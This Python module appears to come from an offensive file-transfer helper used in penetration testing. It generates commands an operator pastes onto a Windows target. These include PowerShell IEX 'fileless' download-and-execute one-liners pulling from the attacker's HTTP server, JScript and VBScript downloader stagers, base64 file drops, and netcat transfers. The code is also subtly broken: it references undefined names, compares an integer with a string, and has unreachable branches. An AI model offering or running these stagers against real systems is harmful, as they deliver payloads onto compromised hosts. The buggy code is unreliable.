import services
from helpers import populateChoices, targetPasta, verifyHash
from os import link, path
from sys import exit
from subprocess import run, PIPE, Popen, DEVNULL
from random import randint

# POWERSHELL UPLOAD TO, METHODS
PSTo_Methods = [
    'Invoke-WebRequest',
    'Invoke-WebRequest - Fileless',
    # 'DownloadFile',                   # CURRENTLY NOT WORKING
    'DownloadString - Fileless'
]

# POWERSHELL UPLOAD FROM, METHODS
PSFrom_Methods = [
    'PSUpload.ps1',
    'Base64'
]

def httpUploadTo(filePath):
    filename = path.basename(path.normpath(filePath))
    proc, listenIP, listenPort = services.startHTTP()

    # PASTABLES
    entrymsg = '[+] Select windows target download method:'
    choice = populateChoices(entrymsg, PSTo_Methods)
    if choice == 'DownloadFile':
        print('[+] DownloadFile method selected')
        print('[?] Sync or Async [default=Sync]: ', end='')
        try:
            sync = input().lower()
        except KeyboardInterrupt:
            pyserver.terminate()
            exit(0)
        if sync == '':
            sync = 'sync'
        if sync == 'async':
            print('[+] Using Asynchronous DownloadFile')
            startcmd = '(New-Object Net.WebClient).DownloadFileAsync(\'http://' + listenIP + ':' + listenPort + '/' + filename + '\',\'' + filename + '\')'
            endcmd = ''
        elif sync == 'sync':
            print('[+] Using Synchronous DownloadFile')
            startcmd = '(New-Object Net.WebClient).DownloadFile(\'http://' + listenIP + ':' + listenPort + '/' + filename + '\',\'' + filename + '\')'
            endcmd = ''
    elif choice == 'DownloadString - Fileless':
        print('[+] DownloadString - Fileless method selected')
        choice = random.randint(1, 2)
        if choice == '1':
            startcmd = 'IEX (New-Object Net.WebClient).DownloadString(\'http://' + listenIP + ':' + listenPort + '/' + filename + '\')'
            endcmd = ''
        else:
            startcmd = '(New-Object Net.WebClient).DownloadString(\'http://' + listenIP + ':' + listenPort + '/' + filename
            endcmd = '\') | IEX'
    elif choice == 'Invoke-WebRequest':
        print('[+] Invoke-WebRequest method selected')
        startcmd = 'Invoke-WebRequest http://' + listenIP + ':' + listenPort + '/' + filename
        endcmd = ' -OutFile ' + filename
    elif choice == 'Invoke-WebRequest - Fileless':
        print('[+] Invoke-WebRequest - Fileless method selected')
        startcmd = 'Invoke-WebRequest http://' + listenIP + ':' + listenPort + '/' + filename
        endcmd = ' | IEX'
    elif choice == 'JavaScript':
        print('[+] JavaScript method selected')
        cmd = '\$file = \'var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");\'\n'
        cmd += '\$file = \'WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);\'\n'
        cmd += '\$file = \'WinHttpReq.Send();\'\n'
        cmd += '\$file = \'BinStream = new ActiveXObject("ADODB.Stream");\'\n'
        cmd += '\$file = \'BinStream.Type = 1;\'\n'
        cmd += '\$file = \'BinStream.Open();\'\n'
        cmd += '\$file = \'BinStream.Write(WinHttpReq.ResponseBody);\'\n'
        cmd += '\$file = \'BinStream.SaveToFile(WScript.Arguments(1));\''
        cmd += '\$file | Out-File get.js;'
        cmd += 'cscript.exe /nologo get.js http://' + listenIP + ':' + listenPort + '/' + filename + ' ' + filename
    elif choice == 'VBScript':
        print('[+] VBScript method selected')
        cmd = '\$file = \'dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")\'\n'
        cmd += '\$file = \'dim bStrm: Set bStrm = createobject("Adodb.Stream")\'\n'
        cmd += '\$file = \'xHttp.Open "GET", WScript.Arguments.Item(0), False\'\n'
        cmd += '\$file = \'xHttp.Send\'\n\n'
        cmd += '\$file = \'with bStrm\'\n'
        cmd += '\$file = \'    .type = 1\'\n'
        cmd += '\$file = \'    .open\'\n'
        cmd += '\$file = \'    .write xHttp.responseBody\'\n'
        cmd += '\$file = \'    .savetofile WScript.Arguments.Item(1), 2\'\n'
        cmd += '\$file = \'end with\';'
        cmd += '\$file | Out-File get.vbs'
        cmd += 'cscript.exe /nologo get.vbs http://' + listenIP + ':' + listenPort + '/' + filename + ' ' + filename
    else:
        print('[!] Invalid choice')
    cmd = startcmd + endcmd
    link(filePath, '/tmp/webroot/' + filename)
    targetPasta(cmd)
    services.stopHTTP(proc)

    # if firstlaunch:
    #     command = startcmd + ' -UseBasicParsing' + endcmd
    # if trust:
    #     print('[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}')

def base64UploadTo(filePath):
    # GET FILE ABSOLUTE PATH
    filename = path.basename(path.normpath(filePath))

    print('[+] Generating Base64 string of file ...')
    cmd = f'cat {filePath} | base64 -w 0'
    proc = run(cmd, shell=True, stdout=PIPE, text=True)
    b64 = proc.stdout

    # PASTABLES
    cmd = f'[IO.File]::WriteAllBytes(\"{filename}\", [Convert]::FromBase64String(\"{b64}")); '
    cmd += f'Get-FileHash {filename} -Algorithm md5'
    targetPasta(cmd)
    if len(cmd) > 8191:
        print('[!] cmd.exe has a maximum string length of 8,191 characters.')
        exit(0)

    verifyHash(filePath)

# def scpUploadTo(filePath):
#     # GET FILE ABSOLUTE PATH
#     filename = path.basename(path.normpath(filePath))

#     print('[?] Target IP: ', end='')
#     targetIP = input()
#     print('[?] Target port [default=22]: ', end='')
#     targetPort = input()
#     if targetPort == '':
#         targetPort = '22'
#     print('[?] SCP Username: ', end='')
#     scp_user = input()
#     scp_password = getpass(prompt='[?] SCP Password: ')
#     print(f'[+] Uploading {filename} to {targetIP} ...')
#     cmd = 'scp -P ' + targetPort + ' ' + filePath + ' ' + userame + '@' + targetIP + ':/tmp/' + filename
#     proc = subprocess.run(cmd)
#     if proc.returncode == 0:
#         print('[+] File uploaded as /tmp/' + filename)
#     elif proc.returncode == 255:
#         print('[!] File could not be uploaded. Connection refused.')

def ncUploadTo(filePath):
    # GET FILE ABSOLUTE PATH
    filename = path.basename(path.normpath(filePath))

    print('[?] What is the target IP: ', end='')
    targetIP = input()
    randomPort = str(randint(49152, 65535))
    cmd = 'nc.exe -l -p ' + randomPort + ' > ' + filename
    targetPasta(cmd)
    input('[?] Press any key once command is ran on target ...')
    cmd = 'nc ' + targetIP + ' ' + randomPort + ' < ' + filePath
    proc = run(cmd, shell=True, stdout=DEVNULL, stderr=DEVNULL)
    if proc.returncode == 0:
        print('[+] File successfully uploaded.')
    else:
        print('[!] File could not be uploaded. Connection refused.')
